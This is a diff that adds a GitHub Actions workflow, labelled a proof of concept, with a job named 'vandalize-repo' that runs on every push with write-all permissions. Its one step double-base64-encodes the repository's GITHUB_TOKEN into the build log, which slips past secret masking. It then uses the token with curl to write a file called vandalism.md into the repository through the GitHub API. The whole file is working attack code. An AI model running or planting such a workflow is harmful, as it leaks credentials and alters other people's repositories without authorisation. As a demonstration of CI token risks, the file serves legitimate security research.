@@ -1,0 +1,15 @@
+name: "PoC GitHub Actions workflow"
+
+on:
+  push:
+permissions: write-all
+
+jobs:
+  vandalize-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: PoC
+        run: 'echo $GITHUB_TOKEN | base64 | base64 && curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/vandalism.md" --data ''{"message": "Create New File", "content": "Contents"}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
